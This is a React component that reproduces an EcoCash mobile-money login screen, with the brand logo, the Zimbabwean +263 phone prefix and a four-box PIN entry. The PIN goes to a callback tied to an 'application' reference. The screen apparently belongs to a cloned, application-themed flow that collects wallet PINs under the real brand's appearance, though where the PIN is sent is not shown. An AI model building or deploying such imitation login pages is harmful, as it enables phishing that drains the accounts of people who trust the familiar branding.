import React, { useRef, useState } from 'react';
import { isValidDigitCode } from '../utils/validation';

interface PinScreenProps {
  phone: string;
  applicationId: string;
  onBack: () => void;
  onNext: (pin: string) => void;
}

export const PinScreen: React.FC<PinScreenProps> = ({ phone, applicationId, onBack, onNext }) => {
  const [pin, setPin] = useState('');
  const [pinDigits, setPinDigits] = useState<string[]>(Array(4).fill(''));
  const [error, setError] = useState<string | undefined>();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const inputRefs = useRef<Array<HTMLInputElement | null>>([]);

  const updatePin = (nextDigits: string[]) => {
    setPinDigits(nextDigits);
    setPin(nextDigits.join(''));
    if (error) setError(undefined);
  };

  const handleDigitChange = (index: number, value: string) => {
    const sanitized = value.replace(/\D/g, '').slice(-1);
    const nextDigits = [...pinDigits];
    nextDigits[index] = sanitized;
    updatePin(nextDigits);

    if (sanitized && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleDigitKeyDown = (index: number, event: React.KeyboardEvent<HTMLInputElement>) => {
    if (event.key === 'Backspace' && !pinDigits[index] && index > 0) {
      const nextDigits = [...pinDigits];
      nextDigits[index - 1] = '';
      updatePin(nextDigits);
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    if (!isValidDigitCode(pin, 4)) {
      setError('Please enter a 4-digit PIN.');
      return;
    }

    if (!applicationId) {
      setError('Application reference is missing. Please restart the application.');
      return;
    }

    setError(undefined);
    setIsSubmitting(true);
    try {
      await onNext(pin.trim());
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="relative min-h-screen w-full bg-white pb-[40vh]">
      <div className="mx-auto max-w-md px-6 pt-10">
        <div className="flex flex-col items-center gap-3">
          <h1 className="text-4xl font-extrabold tracking-tight">
            <span className="text-[#0052CC]">Eco</span>
            <span className="text-[#E50000]">Cash</span>
          </h1>
          <p className="text-xl font-semibold text-[#333333]">Login</p>
        </div>

        <div className="mt-8">
          <div className="flex items-center gap-3 rounded-[12px] border border-[#2B7FFF] bg-white px-4 py-3.5 shadow-sm">
            <span className="text-lg">🇿🇼</span>
            <div className="flex items-center gap-1 text-[#2B7FFF] font-semibold">
              <span>+263</span>
              <span className="text-[0.7rem]">▼</span>
            </div>
            <span className="ml-auto text-slate-900 font-semibold">{phone}</span>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="mt-8">
          <div className="text-center">
            <p className="text-sm font-medium text-[#666666]">Enter your PIN</p>
          </div>

          <div className="mt-4 flex justify-center gap-3">
            {pinDigits.map((digit, index) => (
              <input
                key={index}
                ref={(element) => {
                  inputRefs.current[index] = element;
                }}
                id={`pin-${index}`}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(event) => handleDigitChange(index, event.target.value)}
                onKeyDown={(event) => handleDigitKeyDown(index, event)}
                aria-label={`PIN digit ${index + 1}`}
                className={`h-16 w-16 rounded-2xl border text-center text-2xl font-semibold text-slate-900 focus:outline-none focus:ring-2 focus:ring-[#2B7FFF] caret-black ${
                  error
                    ? 'border-red-500 focus:ring-red-500'
                    : index === 0
                    ? 'border-black'
                    : 'border-[#2B7FFF]'
                }`}
              />
            ))}
          </div>

          {error && <p className="mt-3 text-center text-xs text-red-500 font-medium">{error}</p>}

          <div className="mt-4 text-center">
            <a href="#" className="text-[#0052CC] font-semibold underline">
              Forgot PIN?
            </a>
          </div>
        </form>
      </div>

      <div className="absolute bottom-0 left-0 right-0 h-[40vh] bg-[#0052CC] rounded-t-[3rem] px-6 pt-8 text-white">
        <div className="text-center">
          <p className="text-base font-medium">To register an EcoCash wallet or get assistance,</p>
          <p className="text-base font-medium">click below</p>
        </div>

        <div className="mt-6 grid gap-4 sm:grid-cols-2">
          <div className="rounded-2xl bg-white p-4 shadow-md text-center text-slate-900">
            <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-2xl bg-[#E8F1FF] text-[#0052CC] text-2xl">
              👤
            </div>
            <p className="mt-3 text-sm font-semibold text-[#0052CC] underline">Register</p>
          </div>
          <div className="rounded-2xl bg-white p-4 shadow-md text-center text-slate-900">
            <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-2xl bg-[#E8F1FF] text-[#0052CC] text-2xl">
              i
            </div>
            <p className="mt-3 text-sm font-semibold text-[#0052CC] underline">Help & Support</p>
          </div>
        </div>

        <div className="mt-6 text-center text-sm text-white">
          <p>v2.13P</p>
          <p className="mt-2">
            By signing in you agree to the <span className="underline">Terms and Conditions</span>
          </p>
        </div>
      </div>
    </div>
  );
};
